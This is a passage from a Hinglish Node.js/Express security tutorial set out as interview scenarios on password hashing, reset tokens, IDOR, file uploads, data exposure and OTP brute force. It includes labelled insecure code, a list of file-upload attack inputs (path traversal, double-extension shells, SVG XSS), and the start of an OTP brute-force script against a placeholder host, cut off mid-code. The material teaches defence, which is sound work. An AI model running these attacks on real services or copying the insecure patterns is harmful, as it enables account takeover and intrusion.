    // Rest = hash

    const user = new User({ email, password: hashedPassword });
    await user.save();

    res.status(201).json({ message: "Registered successfully" });
  } catch (err) {
    res.status(500).json({ error: "Registration failed" });
  }
};

// User Login - Password Verify Karo
const loginUser = async (req, res) => {
  try {
    const { email, password } = req.body;

    const user = await User.findOne({ email });
    if (!user) {
      // IMPORTANT: Same message do chahe email galat ho ya password
      return res.status(401).json({ error: "Invalid credentials" });
    }

    // bcrypt.compare automatically stored hash se salt extract karta hai
    const isMatch = await bcrypt.compare(password, user.password);

    if (!isMatch) {
      return res.status(401).json({ error: "Invalid credentials" });
    }

    const token = generateToken(user);
    res.json({ token });
  } catch (err) {
    res.status(500).json({ error: "Login failed" });
  }
};
```

**Mongoose Middleware se Auto-Hash:**

```js
// models/User.js
const userSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true },
  password: { type: String, required: true, select: false },
  // select: false -> queries mein password by default nahi aayega
});

// Save se pehle automatically hash karo
userSchema.pre("save", async function (next) {
  // Sirf tab hash karo jab password modified ho
  if (!this.isModified("password")) return next();

  try {
    this.password = await bcrypt.hash(this.password, 12);
    next();
  } catch (err) {
    next(err);
  }
});

// Instance method for password comparison
userSchema.methods.comparePassword = async function (candidatePassword) {
  return bcrypt.compare(candidatePassword, this.password);
};

// Login mein use:
const user = await User.findOne({ email }).select("+password");
const isMatch = await user.comparePassword(req.body.password);
```

### Why NOT md5/sha256 Alone:

```js
const crypto = require("crypto");

// MD5 - NEVER use for passwords
const md5Hash = crypto.createHash("md5").update("password123").digest("hex");
// "482c811da5d5b4bca..." -> rainbow table se instantly reverse

// SHA256 - Better but still NOT enough for passwords
const sha256Hash = crypto.createHash("sha256").update("password123").digest("hex");
// "ef92b778bafe..." -> GPU se billions per second try kar sakta hai

// bcrypt - DESIGNED for passwords
const bcryptHash = await bcrypt.hash("password123", 12);
// -> Deliberately SLOW (by design)
// -> Salt automatic
// -> GPU resistance (memory-hard)
// -> Cost factor increase kar sakte ho as hardware improves
```

### Hashing vs Encryption - Important Difference:

```
Hashing (one-way):
  "password123" -> bcrypt -> "$2b$12$..."
  "$2b$12$..." -> ??? -> IMPOSSIBLE to get "password123" back
  Use case: Password storage

Encryption (two-way):
  "password123" -> AES + key -> "x8f2m..."
  "x8f2m..." -> AES + key -> "password123" (reversible!)
  Use case: Data you need to read back (e.g., credit card)

Passwords HASHED hone chahiye, ENCRYPTED nahi.
Agar encrypted hai toh key mil gayi = sab passwords reveal.
Agar hashed hai toh koi reverse nahi kar sakta.
```

### Common Mistakes:

```js
// MISTAKE 1: MD5/SHA use karna passwords ke liye
crypto.createHash("sha256").update(password).digest("hex"); // NO!

// MISTAKE 2: Kam salt rounds use karna
bcrypt.hash(password, 4); // Too fast = easy to brute force
// 12+ recommended (takes ~250ms, acceptable for login, slow for attacker)

// MISTAKE 3: Password ko response mein bhejana
res.json(user); // user object mein password hash bhi aa jaayega!
// Mongoose select: false use karo ya explicitly exclude karo

// MISTAKE 4: Custom hashing implement karna
const myHash = md5(md5(password) + "salt"); // Security by obscurity = BAD
// Use proven libraries: bcrypt, argon2, scrypt
```

### Why This Works:
- **bcrypt** deliberately slow hai - attacker ko brute force mein years lagenge
- **Auto-generated salt** har password ke liye unique hash ensure karta hai
- **Cost factor** (salt rounds) future-proof hai - hardware fast ho toh increase karo
- **Industry standard** hai - tested, proven, trusted


---


## Scenario 7: Broken Authentication - Insecure Password Reset

**Q: Tumhara forgot-password flow hai. User email dalta hai, reset link milta hai. Attacker ne link guess kar liya. Kaise secure karoge?**

**A:** Agar reset token predictable hai ya properly implemented nahi hai, toh attacker **kisi bhi user ka password reset** kar sakta hai. Yeh **Broken Authentication** vulnerability hai.

### Insecure Reset Flow (Kya NAHI Karna Hai):

```js
// INSECURE APPROACH 1: Predictable token
app.post("/api/forgot-password", async (req, res) => {
  const user = await User.findOne({ email: req.body.email });

  // WRONG: Sequential/predictable token
  const resetToken = user._id + Date.now(); // Guess kar sakta hai!

  // WRONG: Token never expires
  user.resetToken = resetToken;
  await user.save();

  // WRONG: Reveal if email exists or not
  if (!user) {
    return res.status(404).json({ error: "Email not found" });
    // Attacker ab jaanta hai ki yeh email registered nahi hai
    // Dusri emails try karega -> email enumeration
  }

  sendEmail(user.email, `https://app.com/reset?token=${resetToken}`);
  res.json({ message: "Reset link sent" });
});

// WRONG: Token reusable (ek baar use ke baad bhi valid)
app.post("/api/reset-password", async (req, res) => {
  const user = await User.findOne({ resetToken: req.body.token });
  user.password = req.body.newPassword; // No expiry check, no one-time use
  await user.save();
});
```

### Secure Reset Flow:

**Step 1: Generate Cryptographically Random Token**

```js
const crypto = require("crypto");

app.post("/api/forgot-password", async (req, res) => {
  const { email } = req.body;

  // ALWAYS return same response - don't reveal if email exists
  const genericResponse = {
    message: "If this email is registered, you will receive a reset link.",
  };

  const user = await User.findOne({ email });
  if (!user) {
    // Return SAME response even if user doesn't exist
    return res.json(genericResponse);
  }

  // Rate limiting: Check if recent token exists
  if (user.resetTokenExpiry && user.resetTokenExpiry > Date.now() - 60000) {
    // Token 1 minute se kam purana hai - wait karo
    return res.json(genericResponse); // Same response, no info leaked
  }

  // Generate cryptographically secure random token
  const resetToken = crypto.randomBytes(32).toString("hex");

  // Token ka hash store karo (plain token database mein mat rakho!)
  const resetTokenHash = crypto
    .createHash("sha256")
    .update(resetToken)
    .digest("hex");

  user.resetTokenHash = resetTokenHash;
  user.resetTokenExpiry = Date.now() + 15 * 60 * 1000; // 15 minute expiry
  user.resetTokenUsed = false;
  await user.save();

  // Plain token email mein bhejo (hash database mein hai)
  const resetUrl = `https://myapp.com/reset-password?token=${resetToken}`;

  await sendEmail({
    to: user.email,
    subject: "Password Reset Request",
    html: `
      <p>You requested a password reset.</p>
      <p>Click <a href="${resetUrl}">here</a> to reset your password.</p>
      <p>This link expires in 15 minutes.</p>
      <p>If you didn't request this, please ignore this email.</p>
    `,
  });

  res.json(genericResponse);
});
```

**Step 2: Verify Token and Reset Password**

```js
app.post("/api/reset-password", async (req, res) => {
  const { token, newPassword } = req.body;

  // Password validation
  if (!newPassword || newPassword.length < 8) {
    return res.status(400).json({ error: "Password must be at least 8 characters" });
  }

  // Token ko hash karke database mein match karo
  const tokenHash = crypto.createHash("sha256").update(token).digest("hex");

  const user = await User.findOne({
    resetTokenHash: tokenHash,
    resetTokenExpiry: { $gt: Date.now() },  // Expiry check
    resetTokenUsed: false,                   // One-time use check
  });

  if (!user) {
    return res.status(400).json({
      error: "Invalid or expired reset token",
    });
  }

  // Mark token as used BEFORE resetting password
  user.resetTokenUsed = true;
  user.password = newPassword; // pre-save hook will hash it
  user.resetTokenHash = undefined;
  user.resetTokenExpiry = undefined;

  // Increment token version to invalidate ALL existing JWTs
  user.tokenVersion = (user.tokenVersion || 0) + 1;

  await user.save();

  // Send confirmation email
  await sendEmail({
    to: user.email,
    subject: "Password Changed Successfully",
    html: `<p>Your password has been changed. If this wasn't you, contact support immediately.</p>`,
  });

  res.json({ message: "Password reset successful. Please login again." });
});
```

**Step 3: Rate Limiting on Reset Endpoint**

```js
const rateLimit = require("express-rate-limit");

// Strict rate limiting on forgot-password
const forgotPasswordLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 3,                    // 3 requests per IP per 15 min
  message: { error: "Too many requests. Try again later." },
  standardHeaders: true,
  legacyHeaders: false,
  // IP + email combination se bhi limit karo
  keyGenerator: (req) => {
    return `${req.ip}-${req.body.email || "unknown"}`;
  },
});

app.post("/api/forgot-password", forgotPasswordLimiter, forgotPasswordHandler);

// Reset endpoint pe bhi rate limit
const resetPasswordLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // 5 attempts per 15 min
  message: { error: "Too many attempts. Request a new reset link." },
});

app.post("/api/reset-password", resetPasswordLimiter, resetPasswordHandler);
```

**Complete Mongoose Schema:**

```js
const userSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true, lowercase: true },
  password: { type: String, required: true, select: false },
  resetTokenHash: String,
  resetTokenExpiry: Date,
  resetTokenUsed: { type: Boolean, default: false },
  tokenVersion: { type: Number, default: 0 },
  passwordChangedAt: Date,
});

// Password change hone pe timestamp update karo
userSchema.pre("save", function (next) {
  if (this.isModified("password")) {
    this.passwordChangedAt = Date.now() - 1000; // 1 sec buffer
  }
  next();
});

// Check: JWT password change ke baad issue hua tha ya pehle?
userSchema.methods.changedPasswordAfter = function (jwtTimestamp) {
  if (this.passwordChangedAt) {
    const changedTimestamp = parseInt(this.passwordChangedAt.getTime() / 1000, 10);
    return jwtTimestamp < changedTimestamp; // true = token purana hai
  }
  return false;
};
```

### Common Mistakes:

```js
// MISTAKE 1: Token ko URL mein GET parameter ke roop mein handle karna
// aur server logs mein token dikh jaata hai
// Solution: POST request mein token bhejo

// MISTAKE 2: Email enumeration allow karna
if (!user) res.json({ error: "Email not found" }); // WRONG
// vs
res.json({ message: "If email exists, reset link sent" }); // RIGHT

// MISTAKE 3: Token expire na karna
user.resetToken = token; // kab expire hoga? Kabhi nahi!

// MISTAKE 4: Same token multiple times use hone dena
// Agar attacker ne link intercept kiya, wo bhi use kar sakta hai

// MISTAKE 5: Plain token database mein store karna
user.resetToken = resetToken; // WRONG - agar DB breach ho toh token mil jayega
user.resetTokenHash = hash(resetToken); // RIGHT - hash store karo
```

### Why This Works:
- **Crypto random token** - 32 bytes = 2^256 combinations, guess karna impossible
- **15 min expiry** - Token bahut jaldi expire ho jaata hai
- **One-time use** - Ek baar use ke baad invalid
- **Rate limiting** - Brute force attempts block ho jaayenge
- **Same response** - Attacker ko pata nahi chalega ki email registered hai ya nahi


---


## Scenario 8: API Authorization Bypass (IDOR)

**Q: User A ka token hai. Wo URL mein user B ka ID daal ke uska data access kar raha hai: `GET /api/users/USER_B_ID/orders`. Kaise rokoge?**

**A:** Yeh **IDOR (Insecure Direct Object Reference)** vulnerability hai - OWASP Top 10 mein consistently rehti hai. Server authentication check karta hai (kaun hai?), lekin **authorization check nahi karta** (kya yeh user is resource ko access kar sakta hai?).

### Problem Samjho:

```js
// VULNERABLE CODE - sirf authentication, authorization nahi
app.get("/api/users/:userId/orders", authenticateToken, async (req, res) => {
  // authenticateToken sirf verify karta hai ki token valid hai
  // lekin check NAHI karta ki req.params.userId === logged in user ka id

  const orders = await Order.find({ userId: req.params.userId });
  res.json(orders);
});

// Attack:
// User A logged in hai (userId: "AAA")
// URL change karta hai: GET /api/users/BBB/orders
// User B ke orders mil jaate hain!

// Aur bhi examples:
// GET /api/users/BBB/profile      -> User B ka profile
// PUT /api/users/BBB/email        -> User B ka email change!
// DELETE /api/users/BBB/account   -> User B ka account delete!
```

### Solution 1: Always Verify Resource Ownership

```js
// SECURE: Har route mein ownership check karo
app.get("/api/users/:userId/orders", authenticateToken, async (req, res) => {
  // Check: Requested userId === Logged in user ka id
  if (req.params.userId !== req.user.id) {
    // Admin ko allow karo, baaki ko nahi
    if (req.user.role !== "admin") {
      return res.status(403).json({ error: "Access denied" });
    }
  }

  const orders = await Order.find({ userId: req.params.userId });
  res.json(orders);
});

// EVEN BETTER: URL mein userId ki zaroorat hi nahi
// Token se user identify karo
app.get("/api/my/orders", authenticateToken, async (req, res) => {
  // req.user.id token se aata hai - tamper nahi ho sakta
  const orders = await Order.find({ userId: req.user.id });
  res.json(orders);
});
```

### Solution 2: Authorization Middleware Pattern

```js
// Reusable authorization middleware
const authorizeResourceAccess = (paramName = "userId") => {
  return (req, res, next) => {
    const resourceOwnerId = req.params[paramName];
    const loggedInUserId = req.user.id;

    // Same user hai ya admin hai -> allow
    if (resourceOwnerId === loggedInUserId || req.user.role === "admin") {
      return next();
    }

    // Nahi toh -> 403 Forbidden
    return res.status(403).json({
      error: "You are not authorized to access this resource",
    });
  };
};

// Routes mein use karo
app.get(
  "/api/users/:userId/orders",
  authenticateToken,
  authorizeResourceAccess("userId"), // yeh check karega
  getOrders
);

app.put(
  "/api/users/:userId/profile",
  authenticateToken,
  authorizeResourceAccess("userId"),
  updateProfile
);

app.delete(
  "/api/users/:userId/account",
  authenticateToken,
  authorizeResourceAccess("userId"),
  deleteAccount
);
```

### Solution 3: Query-Level Authorization (Defense in Depth)

```js
// Controller mein bhi ownership ensure karo
const getOrderById = async (req, res) => {
  const order = await Order.findOne({
    _id: req.params.orderId,
    userId: req.user.id, // ALWAYS filter by logged-in user
  });

  if (!order) {
    // Order nahi mila ya user ka nahi hai - same response
    // (don't reveal "order exists but it's not yours")
    return res.status(404).json({ error: "Order not found" });
  }

  res.json(order);
};

// WRONG way:
const getOrderByIdUnsafe = async (req, res) => {
  const order = await Order.findById(req.params.orderId);
  // Kisi ka bhi order mil jaayega - IDOR!
  res.json(order);
};
```

### Solution 4: Role-Based Access Control (RBAC) Middleware

```js
// roles.js - permissions define karo
const permissions = {
  admin: {
    orders: ["create", "read", "update", "delete", "readAll"],
    users: ["create", "read", "update", "delete", "readAll"],
  },
  seller: {
    orders: ["read", "update"],        // apne orders
    products: ["create", "read", "update", "delete"],
  },
  buyer: {
    orders: ["create", "read"],        // apne orders
    products: ["read"],
  },
};

// Permission check middleware
const checkPermission = (resource, action) => {
  return (req, res, next) => {
    const userRole = req.user.role;
    const userPermissions = permissions[userRole];

    if (!userPermissions || !userPermissions[resource]?.includes(action)) {
      return res.status(403).json({
        error: `${userRole} cannot ${action} ${resource}`,
      });
    }

    next();
  };
};

// Usage
app.get(
  "/api/orders",
  authenticateToken,
  checkPermission("orders", "readAll"), // sirf admin
  getAllOrders
);

app.get(
  "/api/orders/:id",
  authenticateToken,
  checkPermission("orders", "read"),
  authorizeResourceAccess("userId"), // ownership check bhi
  getOrderById
);

app.delete(
  "/api/orders/:id",
  authenticateToken,
  checkPermission("orders", "delete"), // admin ya order owner
  deleteOrder
);
```

### Solution 5: Nested Resource Authorization

```js
// POST /api/users/:userId/addresses - address add karna
app.post(
  "/api/users/:userId/addresses",
  authenticateToken,
  async (req, res) => {
    // Level 1: User can only add address to their own profile
    if (req.params.userId !== req.user.id) {
      return res.status(403).json({ error: "Cannot modify other user's data" });
    }

    const address = new Address({
      ...req.body,
      userId: req.user.id, // ALWAYS use token ka userId, URL parameter NAHI
    });

    await address.save();
    res.status(201).json(address);
  }
);

// PUT /api/users/:userId/addresses/:addressId
app.put(
  "/api/users/:userId/addresses/:addressId",
  authenticateToken,
  async (req, res) => {
    // Level 1: User check
    if (req.params.userId !== req.user.id) {
      return res.status(403).json({ error: "Access denied" });
    }

    // Level 2: Address ownership check
    const address = await Address.findOne({
      _id: req.params.addressId,
      userId: req.user.id, // double check - address bhi isi user ka ho
    });

    if (!address) {
      return res.status(404).json({ error: "Address not found" });
    }

    Object.assign(address, req.body);
    await address.save();
    res.json(address);
  }
);
```

### Common Mistakes:

```js
// MISTAKE 1: Client-side access control pe rely karna
// Frontend mein "Edit" button hide karna = security NAHI hai
// Attacker direct API call karega - frontend bypass

// MISTAKE 2: Sirf authentication check karna
app.get("/api/orders/:id", authenticateToken, getOrder);
// "Haan token valid hai" != "Yeh order iska hai"

// MISTAKE 3: Sequential/guessable IDs use karna
// /api/orders/1001, /api/orders/1002, /api/orders/1003
// Attacker easily enumerate kar sakta hai
// Use UUIDs ya MongoDB ObjectIds (harder to guess)

// MISTAKE 4: Different responses for "not found" vs "not authorized"
if (!order) return res.status(404).json({ error: "Not found" });
if (order.userId !== req.user.id) return res.status(403).json({ error: "Forbidden" });
// Attacker ko pata chal gaya ki order EXISTS but belongs to someone else
// CORRECT: Both cases mein 404 return karo
```

### Why This Works:
- **Middleware pattern** - Authorization logic centralized hai, har route mein repeat nahi karna
- **Query-level filtering** - Database se sirf authorized data aata hai
- **Token-based userId** - URL parameter tamper ho sakta hai, token nahi (signed hai)
- **Never rely on client** - Sab checks server-side honge


---


## Scenario 9: File Upload Vulnerability

**Q: User profile picture upload kar raha hai. Koi .exe ya malicious PHP file upload kar de toh? Kaise validate karoge?**

**A:** File upload ek **bahut common attack vector** hai. Attacker malicious files upload karke server pe **Remote Code Execution (RCE)**, **XSS**, ya **directory traversal** kar sakta hai. Sirf file extension check karna kaafi nahi hai.

### Attack Examples:

```
1. Extension rename: malware.exe -> malware.jpg (extension change)
2. Double extension: shell.php.jpg (server php execute kar sakta hai)
3. Null byte: shell.php%00.jpg (purane systems mein .jpg ignore ho jaata)
4. SVG XSS: upload.svg mein <script>alert('xss')</script>
5. Large file: 10GB file upload karke server crash (DoS)
6. Path traversal: filename = "../../etc/passwd"
7. Polyglot files: Valid JPEG that's also valid PHP
```

### Secure File Upload Implementation:

**Step 1: Multer Configuration with Limits**

```js
const multer = require("multer");
const path = require("path");
const crypto = require("crypto");

// Allowed MIME types
const ALLOWED_MIMES = {
  "image/jpeg": ".jpg",
  "image/png": ".png",
  "image/gif": ".gif",
  "image/webp": ".webp",
};

const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    // Upload folder webroot ke BAHAR hona chahiye
    cb(null, "/app/uploads/temp"); // NOT inside /public/
  },
  filename: (req, file, cb) => {
    // NEVER use original filename (path traversal risk)
    const uniqueName = crypto.randomBytes(16).toString("hex");
    const ext = ALLOWED_MIMES[file.mimetype];
    cb(null, `${uniqueName}${ext}`);
    // "../../hack.php" ban jaayega "a8f2k9m3p1x7.jpg"
  },
});

const fileFilter = (req, file, cb) => {
  // Check 1: MIME type allowed hai?
  if (!ALLOWED_MIMES[file.mimetype]) {
    return cb(new Error(`File type ${file.mimetype} not allowed`), false);
  }

  // Check 2: Extension bhi verify karo (MIME spoof ho sakta hai)
  const ext = path.extname(file.originalname).toLowerCase();
  const allowedExts = [".jpg", ".jpeg", ".png", ".gif", ".webp"];
  if (!allowedExts.includes(ext)) {
    return cb(new Error(`Extension ${ext} not allowed`), false);
  }

  cb(null, true);
};

const upload = multer({
  storage,
  fileFilter,
  limits: {
    fileSize: MAX_FILE_SIZE,   // 5MB max
    files: 1,                  // ek baar mein 1 file
    fields: 10,                // max 10 form fields
  },
});
```

**Step 2: Magic Bytes Verification (Most Important)**

```js
const fileType = require("file-type");
const fs = require("fs");

// MIME type spoof ho sakta hai, but magic bytes nahi
// Har file type ke starting bytes unique hote hain:
// JPEG: FF D8 FF
// PNG:  89 50 4E 47
// GIF:  47 49 46 38

const verifyFileType = async (filePath) => {
  const buffer = Buffer.alloc(4100); // first 4100 bytes read karo
  const fd = await fs.promises.open(filePath, "r");
  await fd.read(buffer, 0, 4100, 0);
  await fd.close();

  const type = await fileType.fromBuffer(buffer);

  if (!type) {
    return { valid: false, error: "Could not determine file type" };
  }

  const allowedTypes = ["image/jpeg", "image/png", "image/gif", "image/webp"];

  if (!allowedTypes.includes(type.mime)) {
    return { valid: false, error: `Detected type: ${type.mime} is not allowed` };
  }

  return { valid: true, detectedType: type.mime };
};

// Example:
// attacker.exe renamed to attacker.jpg
// Extension: .jpg (looks ok)
// MIME header: image/jpeg (spoofed)
// Magic bytes: 4D 5A (MZ = .exe signature)  CAUGHT!
```

**Step 3: Complete Upload Endpoint**

```js
const sharp = require("sharp"); // image processing library

app.post(
  "/api/upload/avatar",
  authenticateToken,
  upload.single("avatar"),
  async (req, res) => {
    try {
      if (!req.file) {
        return res.status(400).json({ error: "No file uploaded" });
      }

      const tempPath = req.file.path;

      // Step 1: Magic bytes verify karo
      const typeCheck = await verifyFileType(tempPath);
      if (!typeCheck.valid) {
        // Delete the suspicious file immediately
        await fs.promises.unlink(tempPath);
        return res.status(400).json({ error: typeCheck.error });
      }

      // Step 2: Image re-process karo (strips metadata + malicious content)
      const processedFileName = `avatar_${req.user.id}_${Date.now()}.jpg`;
      const outputPath = `/app/uploads/avatars/${processedFileName}`;

      await sharp(tempPath)
        .resize(300, 300, {
          fit: "cover",
          withoutEnlargement: true,
        })
        .jpeg({ quality: 80 })      // Force JPEG output
        .toFile(outputPath);

      // Re-processing karne se:
      // - EXIF metadata strip ho jaata hai (GPS location etc.)
      // - Embedded malicious code hat jaata hai
      // - Image guaranteed valid ban jaata hai

      // Step 3: Temp file delete karo
      await fs.promises.unlink(tempPath);

      // Step 4: Database mein path save karo
      await User.findByIdAndUpdate(req.user.id, {
        avatar: `/avatars/${processedFileName}`,
      });

      res.json({
        message: "Avatar uploaded successfully",
        avatar: `/avatars/${processedFileName}`,
      });
    } catch (err) {
      // Cleanup on error
      if (req.file?.path) {
        await fs.promises.unlink(req.file.path).catch(() => {});
      }
      res.status(500).json({ error: "Upload failed" });
    }
  }
);

// Error handler for multer errors
app.use((err, req, res, next) => {
  if (err instanceof multer.MulterError) {
    if (err.code === "LIMIT_FILE_SIZE") {
      return res.status(400).json({ error: "File too large. Max 5MB allowed." });
    }
    return res.status(400).json({ error: err.message });
  }
  if (err.message?.includes("not allowed")) {
    return res.status(400).json({ error: err.message });
  }
  next(err);
});
```

**Step 4: Serve Files Securely**

```js
// WRONG: Static serve from upload directory
app.use("/uploads", express.static("uploads")); // DANGEROUS!
// Agar PHP file upload ho gayi toh execute ho sakti hai

// RIGHT: Controlled file serving
app.get("/api/files/:filename", authenticateToken, async (req, res) => {
  const filename = path.basename(req.params.filename); // path traversal se bacho
  const filePath = path.join("/app/uploads/avatars", filename);

  // File exists check
  try {
    await fs.promises.access(filePath);
  } catch {
    return res.status(404).json({ error: "File not found" });
  }

  // Set security headers
  res.set({
    "Content-Type": "image/jpeg",                    // Force content type
    "Content-Disposition": "inline",                 // Display, don't download
    "X-Content-Type-Options": "nosniff",             // Browser MIME sniffing band
    "Cache-Control": "private, max-age=86400",
  });

  res.sendFile(filePath);
});

// BEST: Use cloud storage (S3/Cloudinary)
// Files apne server pe store hi mat karo
const cloudinary = require("cloudinary").v2;

const uploadToCloud = async (filePath) => {
  const result = await cloudinary.uploader.upload(filePath, {
    folder: "avatars",
    transformation: [{ width: 300, height: 300, crop: "fill" }],
    allowed_formats: ["jpg", "png", "gif", "webp"],
  });
  return result.secure_url;
};
```

### Common Mistakes:

```js
// MISTAKE 1: Sirf extension check karna
if (file.originalname.endsWith(".jpg")) { } // WRONG
// "malware.exe" ko rename karke "malware.jpg" bana do -> bypass!

// MISTAKE 2: Sirf Content-Type header check karna
if (file.mimetype === "image/jpeg") { } // WRONG
// Postman se Content-Type header change kar sakte hain

// MISTAKE 3: Original filename use karna
const path = `uploads/${file.originalname}`; // WRONG
// Filename: "../../etc/passwd" -> path traversal!

// MISTAKE 4: Upload folder webroot mein rakhna
app.use(express.static("public"));
// uploads/ inside public/ -> direct access + possible execution

// MISTAKE 5: File size limit na lagana
// Attacker 10GB file upload karega -> disk full -> DoS
```

### Why This Works:
- **Magic bytes** check ensures file actually wo hai jo bolti hai
- **Sharp re-processing** embedded malicious content strip kar deta hai
- **Random filenames** path traversal aur filename guessing prevent karta hai
- **Outside webroot** storage means files directly executable nahi hain
- **Cloud storage** apne server se risk hi hata deta hai


---


## Scenario 10: Sensitive Data in API Response

**Q: `GET /api/users` endpoint sab users return karta hai with password hash, email, phone, tokens. Kya problem hai?**

**A:** Yeh **Excessive Data Exposure** hai - agar API response mein unnecessary sensitive data aa raha hai toh koi bhi (attacker, unauthorized user, ya even browser dev tools mein dekh ke) wo data access kar sakta hai. **API ko sirf wahi data return karna chahiye jo client ko actually chahiye.**

### Problem Samjho:

```js
// VULNERABLE: Sab kuch return kar raha hai
app.get("/api/users", async (req, res) => {
  const users = await User.find();
  res.json(users);
});

// Response:
[
  {
    "_id": "64a...",
    "name": "Rahul",
    "email": "rahul@gmail.com",        // Personal info
    "phone": "+91-9876543210",          // Personal info
    "password": "$2b$12$...",           // PASSWORD HASH!
    "resetTokenHash": "a8f2...",        // Security token!
    "refreshToken": "eyJhb...",         // Session token!
    "role": "admin",                    // Role info
    "address": "123 Main St...",        // PII
    "creditCard": "4111-xxxx-xxxx-1234", // Financial data
    "__v": 0
  }
]
// Agar yeh response network tab mein dikha ya cached ho gaya -> DISASTER
```

### Solution 1: Mongoose `select: false` (Schema Level)

```js
// models/User.js
const userSchema = new mongoose.Schema({
  name: { type: String, required: true },
  email: { type: String, required: true },
  phone: { type: String },

  // Yeh fields by DEFAULT queries mein nahi aayengi
  password: { type: String, required: true, select: false },
  resetTokenHash: { type: String, select: false },
  refreshToken: { type: String, select: false },
  tokenVersion: { type: Number, default: 0, select: false },

  role: { type: String, enum: ["user", "admin"], default: "user" },
  createdAt: { type: Date, default: Date.now },
});

// Ab User.find() mein password, tokens etc. NAHI aayenge automatically
const users = await User.find(); // password excluded!

// Jab explicitly chahiye (e.g., login mein):
const user = await User.findOne({ email }).select("+password");
// "+password" explicitly include karega
```

### Solution 2: Query Projection (Field Selection)

```js
// Specific fields select karo query mein
app.get("/api/users", async (req, res) => {
  // Method 1: Include only specific fields
  const users = await User.find()
    .select("name email avatar createdAt")
    .lean(); // lean() gives plain JS objects (faster)

  // Method 2: Exclude specific fields
  const users2 = await User.find()
    .select("-password -resetTokenHash -refreshToken -phone -__v")
    .lean();

  res.json(users);
});

// Response ab:
[
  {
    "_id": "64a...",
    "name": "Rahul",
    "email": "rahul@gmail.com",
    "avatar": "/avatars/rahul.jpg",
    "createdAt": "2024-01-15T..."
  }
]
// Clean! Sirf zaroori data
```

### Solution 3: Response DTO (Data Transfer Object) Pattern

```js
// dto/userDTO.js - Define what data to expose
const publicUserDTO = (user) => ({
  id: user._id,
  name: user.name,
  avatar: user.avatar,
  // Email/phone NAHI dena public API mein
});

const privateUserDTO = (user) => ({
  id: user._id,
  name: user.name,
  email: user.email,
  phone: user.phone,
  avatar: user.avatar,
  role: user.role,
  createdAt: user.createdAt,
  // password, tokens KABHI nahi dena
});

const adminUserDTO = (user) => ({
  ...privateUserDTO(user),
  role: user.role,
  lastLogin: user.lastLogin,
  isActive: user.isActive,
  // Even admin ko password hash nahi dena
});

// Controllers mein use karo
app.get("/api/users", async (req, res) => {
  const users = await User.find().lean();
  res.json(users.map(publicUserDTO)); // sirf public data
});

app.get("/api/users/me", authenticateToken, async (req, res) => {
  const user = await User.findById(req.user.id).lean();
  res.json(privateUserDTO(user)); // apna data (more fields)
});

app.get("/api/admin/users", authenticateToken, requireAdmin, async (req, res) => {
  const users = await User.find().lean();
  res.json(users.map(adminUserDTO)); // admin view
});
```

### Solution 4: Mongoose `toJSON` Transform (Automatic)

```js
// models/User.js
const userSchema = new mongoose.Schema({
  name: String,
  email: String,
  password: { type: String, select: false },
  refreshToken: { type: String, select: false },
  // ... other fields
});

// toJSON transform - jab bhi JSON mein convert hoga, sensitive fields hata do
userSchema.set("toJSON", {
  transform: function (doc, ret) {
    // ret = returned object (modifiable)
    delete ret.password;
    delete ret.refreshToken;
    delete ret.resetTokenHash;
    delete ret.__v;

    // _id ko id mein rename (cleaner API)
    ret.id = ret._id;
    delete ret._id;

    return ret;
  },
});

// toObject ke liye bhi same karo
userSchema.set("toObject", {
  transform: function (doc, ret) {
    delete ret.password;
    delete ret.__v;
    return ret;
  },
});

// Ab chahe kuch bhi karo, password response mein NAHI aayega:
const user = await User.findById(id);
res.json(user); // password automatically excluded
```

### Solution 5: Middleware Pattern for Response Filtering

```js
// middleware/filterResponse.js
const filterFields = (allowedFields) => {
  return (req, res, next) => {
    // Override res.json to filter fields
    const originalJson = res.json.bind(res);

    res.json = (data) => {
      if (Array.isArray(data)) {
        const filtered = data.map((item) => pick(item, allowedFields));
        return originalJson(filtered);
      }

      if (typeof data === "object" && data !== null) {
        return originalJson(pick(data, allowedFields));
      }

      return originalJson(data);
    };

    next();
  };
};

// Utility function
const pick = (obj, fields) => {
  return fields.reduce((result, field) => {
    if (obj[field] !== undefined) {
      result[field] = obj[field];
    }
    return result;
  }, {});
};

// Usage
app.get(
  "/api/users",
  filterFields(["id", "name", "avatar", "createdAt"]),
  getUsers
);

app.get(
  "/api/users/me",
  authenticateToken,
  filterFields(["id", "name", "email", "phone", "avatar", "role"]),
  getProfile
);
```

### Common Mistakes:

```js
// MISTAKE 1: res.json(user) - poora document bhej dena
app.get("/api/profile", async (req, res) => {
  const user = await User.findById(req.user.id);
  res.json(user); // Sab kuch chala jaayega bina toJSON transform ke!
});

// MISTAKE 2: Frontend pe filtering karna
// "Hum toh display nahi kar rahe password"
// Lekin Network tab mein dikh raha hai! Dev tools mein sab hai!

// MISTAKE 3: List endpoint pe sensitive data bhejana
// /api/users mein email/phone dena = data harvesting
// Public list mein sirf name + avatar + id dena chahiye

// MISTAKE 4: Error messages mein sensitive data
catch (err) {
  res.status(500).json({ error: err.message, stack: err.stack });
  // Stack trace mein file paths, line numbers sab dikh jaata hai!
}
// Production mein:
res.status(500).json({ error: "Internal server error" });

// MISTAKE 5: Pagination na lagana
const users = await User.find(); // 1 million users?!
// Har API pe pagination lagao:
const users = await User.find().limit(20).skip(page * 20);
```

### Why This Works:
- **select: false** - Schema level pe sensitive fields default exclude
- **DTOs** - Clear contract ki kya data jaayega - role-based
- **toJSON transform** - Automatic safety net - bhoolne pe bhi safe
- **Defense in depth** - Multiple layers ensure sensitive data kabhi leak na ho


---


## Scenario 11: Brute Force on OTP

**Q: OTP 4 digits hai (0000-9999). Attacker script se sab 10,000 combinations try kar raha hai. Kaise rokoge?**

**A:** 4-digit OTP mein sirf **10,000 possible combinations** hain. Attacker automated script se **seconds mein** sab try kar sakta hai. Yeh brute force attack hai aur isse multiple layers se rokna padta hai.

### Attack Script (Yeh itna easy hai):

```js
// Attacker ki script - sab 10,000 OTPs try karna
const axios = require("axios");

const bruteForceOTP = async (phone) => {
  for (let otp = 0; otp <= 9999; otp++) {
    const otpString = otp.toString().padStart(4, "0"); // "0000" to "9999"

    try {
      const res = await axios.post("https://target.com/api/verify-otp", {
        phone,
        otp: otpString,
      });

      if (res.data.success) {
        console.log(`OTP found: ${otpString}`);
